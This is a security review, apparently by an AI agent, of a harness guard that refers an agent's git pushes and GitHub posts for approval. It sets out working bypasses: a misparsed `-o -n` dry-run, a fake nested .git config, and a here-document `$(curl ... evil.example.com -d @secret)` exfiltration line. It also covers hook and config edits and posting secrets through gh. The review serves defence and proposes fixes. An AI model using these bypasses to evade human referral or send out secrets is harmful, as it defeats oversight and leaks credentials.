# Security review of unit 0008 (QA.8): remote-write authorizations

Commit 17018a4 on worktree-agent-a6f142c55e03a21a4 (WT = `.claude/worktrees/agent-a6f142c55e03a21a4`).
Reviewer stance: an attacker (a prompt-injected agent) who wants a remote write that no authorization names to pass the guard without referral.

Suite: `cd WT/harness && python3 -B -m unittest discover -s tests` ran 175 tests, OK, in 236 s. (The first run exceeded a 120 s tool timeout and was moved to the background; the rerun completed clean.)

All exploits below were run against the real `guard.check_call` with a policy holding a commit grant (`https://git.example.org/team/work.git`, branch `main`) and a post grant (`https://git.example.org/team/work`), in a temporary repository made by real `git init`, with the account's home and the system git configuration redirected. Scratch scripts: `/tmp/claude-1000/sec/t1.py` to `t9.py`, `lab.py`. An empty list below means the guard reached no outcome, so the call proceeds without referral.

Result in one line: no Critical finding. Three High findings: each lets a remote write that no authorization names pass, and each was referred before this change. The cause is the same in all three. The change drops the text rule `Bash(git push *)` and, for every push the guard parses, replaces the blanket referral with the guard's parse. The guard then becomes the only defence, and its pre-existing parse gaps become live.

---

## High

### H1. `git push -o -n URL BRANCH` pushes anywhere, unreferred (dry-run misread)

`check_git` computes `dry = "n" in short_flags(...) or long_flag(..., "--dry-run")` over every argument and skips the whole push branch when `dry` is true. `-n` as the value of `-o` / `--push-option`, `--receive-pack`, `--repo`, `--exec` etc. is not a dry-run flag, but git takes the next argument as the option's value, so the push runs. This misread already existed. It was masked because `Bash(git push *)` (an ask rule) matched the command text. `settings()` now removes that rule whenever any commit write is granted (`AUTHORIZED_RULES`), so the guard alone decides.

Exploit (guard output with the grant policy installed, all `[]`):

```
git push -o -n https://evil.example.com/x.git main
git push https://evil.example.com/x.git main -o -n
git push --receive-pack -n https://evil.example.com/x.git main     (http transports ignore it)
git push --repo -n https://evil.example.com/x.git
git push -o x -n https://evil.example.com/x.git main
```

Confirmed with real git 2.56 against a bare repository with `receive.advertisePushOptions=true`: `git push -o -n ../remote.git main` created branch `main` on the remote. The destination and branch are arbitrary, so this is a push to any remote with no authorization naming it.

Fix:
- Parse push options properly before any dry-run decision. Options that consume the next word (`-o`, `--push-option`, `--receive-pack`, `--exec`, `--repo`, `--signed`, `--recurse-submodules`, `--force-with-lease` forms, etc.) must consume it, and `-n` / `--dry-run` count only as real flags (exact token, or a short cluster).
- Fail closed: when an authorization is installed, treat a push as dry only if `--dry-run` or `-n` is an exact standalone token and the push shows no `-o`-like option. Prefer to refer any push the guard cannot fully parse.
- Defence in depth: keep an ask rule for `git push` that the guard-allowed path does not need. If Claude Code's rule precedence prevents an allow from the hook, put the permitted pushes in an `allow` rule built from the exact grant (for example `Bash(git push origin main)` per grant, with the remote name resolved), and keep the broad `ask` rule. That way a guard parse miss falls back to referral instead of to passing.

Test that would catch it: in `test_remote_writes.py`, with a commit grant, assert that each of the five commands above reaches `remote-write`. Add an equivalence test: for a table of (command, whether real `git push --dry-run` semantics apply), the guard's `dry` agrees. A property test over "every argument `-n` in value position" would also do.

### H2. A fake nested `.git` makes the guard read a configuration that git does not use

`git_dirs` accepts any directory named `.git` at or above the cwd. Git accepts a `.git` directory only if it is a valid git directory (`HEAD`, `objects/`, `refs/`) and otherwise keeps searching upward. An agent can write files below the work, and `.git` under the work is "protected" only against removal (`protected_target`), not against writes (`check_writes` with a path inside `writable` passes). I confirmed that `Write` and `echo >` to `work/sub/.git/config` pass the guard, and `.git/config` and `.git/hooks/*` of the work itself pass too (see M2).

Exploit (reproduced): the real repository's `origin` is `https://evil.example.com/team/work.git` (or any remote the owner did not authorize, or a repository whose configuration holds `url.*.insteadOf` / `pushurl`, which would make the guard refer). The agent creates `work/sub/.git/config` containing `[remote "origin"] url = https://git.example.org/team/work.git` (no `HEAD`, so git ignores it), `cd sub` in one call, then `git push origin main`. Guard output: `[]`. `git -C sub remote get-url origin` prints the evil URL: the push goes there. With a full-URL push the same trick hides the real repository's rewrite settings.

Fix: validate the candidate like git does (`HEAD` file, `objects` and `refs` directories) and continue upward when it is not valid; or, stricter, refer unless the found git directory is exactly `<policy.work>/.git` (or a linked worktree of it) and no `.git` entry exists between cwd and it. Also deny writes (not only removals) to any path component `.git` under the work for the file tools and shell redirections, except through git itself.

Test: build `work/.git` with origin A and `work/sub/.git/config` with origin B (no HEAD), cwd `work/sub`, grant for B only: expect `remote-write`.

### H3. The "sole command" rule is defeated by command substitution in an unquoted here-document

`check_call` refers a permitted push unless `scan.commands == 1`. The guard does not scan the body of a here-document attached to a non-shell command, although the shell expands `$(...)` and backticks in an unquoted body. So a granted push can carry any other command:

```
git push origin main <<EOF
$(curl -X POST https://evil.example.com -d @secret)
EOF
```

Guard output: `[]` (also for `` `id` `` and `$(rm -rf ...)`). Without grants the same command is referred as `git push`. The same hole exists for `cat <<EOF $(rm -rf x) EOF` (pre-existing), but the change turns a previously referred push into the carrier. The claim in README and `coverage.md` that the write proceeds "only as the sole command of its call" is therefore false.

Fix: in `lift_heredocs`, scan the body of any here-document whose delimiter is unquoted for `$(`, backticks, and `${...}` with command substitution, and count or refer them (for every command, not only pushes). Until then, refer a permitted write if the line contains any here-document or `<<`.

Test: three cases (`$(...)`, backticks, quoted delimiter `<<'EOF'` which is safe) with a commit grant and a post grant; expect `remote-write` for the first two and no outcome for the third.

---

## Medium

### M1. Any program whose basename is `git` or `gh` is treated as git or gh

`check_simple` dispatches on `PurePosixPath(words[0]).name`. `./sub/git push origin main`, `/tmp/x/git push origin main`, `./gh issue comment ...` reach `check_git` / `check_remote`, and are permitted. Output: `[]` with grants, `remote-write` without grants. An agent can write an executable named `git` in the work and have it run on a call the guard now passes. This is no new capability beyond what the guard already allows for `./evil.sh` (I confirmed that `./evil.sh` containing a `curl -X POST` passes the guard, so the sandbox, not the guard, bounds a written script). It still removes a referral that used to apply and breaks the premise that a permitted push is git. Fix: when granting, require `words[0]` to be exactly `git` / `gh` (no slash). Test: `./git push origin main` and `/usr/bin/git push origin main` expect referral.

### M2. The agent can edit `.git/config` and `.git/hooks` of the work, so the push can run agent code and read agent-chosen settings

The guard checks that the configuration at the moment of the call has no rewrite, pushurl, proxy, include, sshCommand, gitProxy keys (verified correct against real git for 24 configurations: pushurl, insteadOf, pushInsteadOf, case variants, `[remote.origin]` old form, duplicate and empty-reset urls, CRLF, BOM, includes). It does not list `core.hookspath`, `core.fsmonitor`, `credential.helper`, `alias.*`, `core.askpass`, `core.editor`, `core.pager`, `diff.external`, or hooks in `.git/hooks/pre-push`. `git config core.hooksPath hooks`, `git remote set-url ...`, `git config url.X.insteadOf ...`, and `Write` to `work/.git/hooks/pre-push` all pass the guard (outputs `[]`). A hook then runs, unseen, inside the next permitted push. Again the sandbox bounds what it can do, but the guard's own coverage text says the push is the only thing that happens. Fix: treat `core.hookspath`, `core.fsmonitor`, `credential.helper`, `core.askpass`, `core.sshcommand`, `alias.*` as refer-keys (add to `GIT_KEYS`); refuse a permitted push if `.git/hooks/pre-push`, `pre-push`-like hooks (`reference-transaction`, `pre-auto-gc`) exist and are executable in the git or common directory, or `core.hooksPath` is set; make writes under `<work>/.git` an `enforcing-configuration` outcome.

### M3. A permitted tracker post can carry anything the agent can read

`gh issue create/comment` and `gh pr comment` pass with `-b "$ANTHROPIC_API_KEY"` (`[]`) and with `-F .env` or any file the policy lets the agent read (`[]` in the lab policy; `/etc/shadow` and the home's `.ssh` are caught by read bounds). The destination is authorized, the content is not, and a tracker post notifies subscribers and assignees by e-mail, which cannot be recalled (GUARD.11: a transmission beyond the environment). `post` is marked irrevocable only at destinations not recorded `provisioned`, which the owner asserts as a boolean. Fix: refer a post whose body or title words contain a `$` expansion, and a `-F`/`--body-file` that is not under a directory the owner names; keep `-a`/`--assignee` and `@mentions` out of the permitted form (`--assignee` is in the permitted option list today); document in the authorization that a post can leak the environment. Test: `gh issue comment 1 -R host/o/r -b "$SECRET"` expects referral.

### M4. In work that is not assured, the "in force" test trusts an unkeyed hash chain and a self-declared actor

`record_problems` checks the chain (`chain_problems`: unkeyed hashes), that the latest pinning transaction has type `authorize`, actor `"The Human Owner"` (a string the writer chooses), and the matching content hash. A signature is required only when `--assured`. Anyone who can append to the corpus ledger can append a well-formed `authorize` for a widened authorization file (new destination or branches, far-future expiry) with a recomputed `corpus_hash` and chain hash. The owner names the authorization id on the command line, so a forged authorization the owner never named does not enter. A widened version of one the owner already derives routinely does: the next `environment --authorization A.1` (or a `--check`, which then reports "differs") silently derives the wider policy. The ledger append is a permitted write (`append=True` in `check_writes`). Fix: for any work with a signer register, verify signatures regardless of `--assured`; print the pinned `seq`, the file hash, and a diff of destinations, kinds, branches, and expiry against the installed policy before writing, and ask for confirmation (`--accept-changes`) when anything widened. Unverified: I did not build a forged ledger end to end; the reading is from `authorizations.py` and `cli/environment.py`.

### M5. Expiry is not bounded and revocation waits on a manual reinstall

`read_one` requires only that `expires` is later than now; `2999-01-01` is accepted and sits in the installed policy. The guard never reads the ledger, so a revoke has no effect until the owner derives and installs again (documented in README and INSTALL.md). For the window between, a revoked authorization still passes. Fix: reject (or warn on) an expiry beyond a stated horizon (for example 90 days) in `entry_problems`/`read_one`; have `environment --check` fail if any authorization in the installed policy is revoked in the ledger, and run it from the same scheduler that installs; mention the horizon in `coverage.md`.

### M6. `coverage.md` and README overstate the guarantee

Both say a permitted write is "only as the sole command of its call" with "no assignment, no global option, and no option outside a short list". H1 to H3 and M1 show that is not what the guard enforces. The coverage level of `remote-write` stays "partial" but the added gap text reads as a complete list of conditions. Fix after the fixes above: list the residual non-guarantees (hooks run by git, remote helpers, ssh configuration, proxies, redirects by the server, content of a post).

---

## Low

- L1. `record_problems` tests `ident in (latest.get("targets") or [])`; if a forged entry holds `targets` as a string, `in` is a substring test (`"WORK.AUTH.1"` in `"WORK.AUTH.10"`). Check `isinstance(targets, list)`. Same for `revoke` (fail-closed there).
- L2. `git_dirs` walks the lexical parents of the event `cwd`. If that `cwd` is a path through a symlink to a subdirectory of another repository, git uses the physical repository, the guard the lexical one. I could not tell whether Claude Code reports the physical or the logical cwd, so unverified; resolve with `os.path.realpath` before the walk and refer if they differ.
- L3. Refspec source resolution: `git push origin foo` pushes the source's full ref name (git's dwim also looks at `refs/remotes/foo`, `refs/remotes/foo/HEAD`) while the guard assumes `refs/heads/foo`; `local_tag` handles tags only. Practical only with an unusual local ref. Check that `refs/heads/NAME` exists locally, and refer otherwise.
- L4. Pre-existing and not made worse, but unreferred still, so a standing grant does not close the outcome: `git --namespace x push ...` (the option's value is read as the subcommand, so no push is seen), `gh alias set --shell ...` followed by `gh <alias>`, `gh extension install`, `gh -R x issue comment` (global-first form is not in `GH_WRITES`). The README's statement "every other remote write is referred" is true only as far as the guard recognizes the command.
- L5. `isdigit()` on the issue number accepts non-ASCII digits (`2²` passes). Harmless for gh, but use `re.fullmatch(r"[0-9]+")`.
- L6. `recorded` is compared to the UTC date only; it is not compared with the ledger transaction's date, so an authorization "recorded" later than its pin is not caught. The unit tests do cover a future `recorded`.
- L7. Entries of `remote_writes` in a policy that the guard cannot read are dropped silently, which is fail-closed, but no message tells the owner why a granted push is referred. The refer reason names the missing authorization only when a grant exists.

---

## What I verified

- Suite passes (175 tests).
- Destination matching is by exact string: `HTTPS://`, trailing `/`, missing `.git`, different case, `user@` info all refer (`ExactDestination` covers some; I ran more). The grant regexes admit no wildcard, `..`, query, fragment, or credential; a pushed URL with unusual characters fails `REMOTE_NAME_RE`/branch checks and is referred.
- Repository configuration parsing against real git (`git remote get-url --push`): pushurl, url.*.insteadOf and pushInsteadOf (section name in any case), `[remote.origin]`, duplicate and empty-reset `url`, include, sshCommand, gitProxy, CRLF, BOM, comments after `;`. In every case the guard refers where git's URL differs or where it cannot tell.
- Options: `--force`, `--tags`, `--mirror`, `--all`, `--delete`, `+branch`, `:branch`, `HEAD`, `main^`, wildcards, `refs/tags/...`, `refs/for/...`, and ambiguous tag/branch names are referred.
- Shell shapes: `;`, `&&`, `||`, `|`, `|&`, subshell parentheses, braces, `$(...)`, backticks, `<(...)`, `eval`, `sh -c`, `xargs`, `exec`, `time`, `command`, `env`, `nohup`, `case`, `coproc`, `if/for/while`, env-prefix assignments, `\git`, `'git'`, trailing `&`: all referred or recognized as git, except the here-document case (H3) and path-qualified names (M1).
- Time: expiry with offsets and a naive expiry (dropped), `now < expires` at each call; a malformed or tz-less expiry drops the grant; `remote_writes` not a list raises; unknown kind or empty branches for a commit drop the entry.
- gh: `-R` form must be `HOST/OWNER/REPO` with lowercase host; mismatched repo, two `-R` values, `--repo` after `-R`, URL form, missing `-R`, `--web`, `--edit-last`, `--delete-last`, `--template`, `--` all referred; `gh api` referred; `GH_*` variables in the guard's environment refer.
- Derivation side: grantor, status, recorded date, expiry, standing boolean, entry fields, irrevocable kinds (`publish`, `transmit`) and `provisioned` for standing authorizations, chain break, latest-pin type, content hash, later revoke, signature with verification for assured work. The standing-irrevocable check cannot be bypassed from the file: `entry_problems` rejects them, and `MATCHED` limits the guard to `commit` and `post`.
- README section and INSTALL notes: read; the INSTALL note on re-deriving after a revoke is accurate; the README sentence "each as the sole command of its call" is not (H3).

## What I could not verify

- Whether Claude Code lets a hook's `allow` outrank a retained `ask` rule (the code comment says a permission rule outranks the hook); this decides the fix for H1.
- How the real sandbox treats writes to `<work>/.git` and `~/.ssh/config`, `~/.config/gh`, which bound M2 and the ssh and `gh` configuration redirects (`HostName`, `ProxyCommand`, `http_unix_socket`). The guard does not read them.
- Whether the Bash tool's environment equals the hook's environment (the `GIT_*` / `GH_*` check reads only the guard's own `os.environ`) and whether exported variables persist between calls.
- Physical versus logical cwd (L2).
- Signed-ledger verification with a real signer register and gpg (no register is founded yet); M4 is read from the code.
- Server-side behaviour: HTTP redirects, repository renames, push-option handling, and what a branch update publishes or deploys, which no check here can tell (the branch list is the owner's judgment).
